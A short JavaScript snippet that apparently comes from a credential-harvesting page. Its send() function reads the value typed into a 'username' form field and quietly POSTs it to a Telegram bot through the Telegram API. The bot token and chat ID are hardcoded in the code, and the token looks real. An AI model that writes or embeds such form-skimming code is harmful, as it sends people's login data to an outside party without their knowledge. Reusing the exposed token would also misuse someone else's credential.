function sendtelegram(message) { let telegram_bot_id = "6668206236:AAF5--89Z92rRQW5kaG4IfHI6-k77AY8gdE"; let chat_id = 6274829789; let settings = { "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" }, "data": JSON.stringify({ "chat_id": chat_id, "text": message }) }; $.ajax(settings).done(function (response) { }); };
function send(){
    sendtelegram(document.getElementById("username").value);
}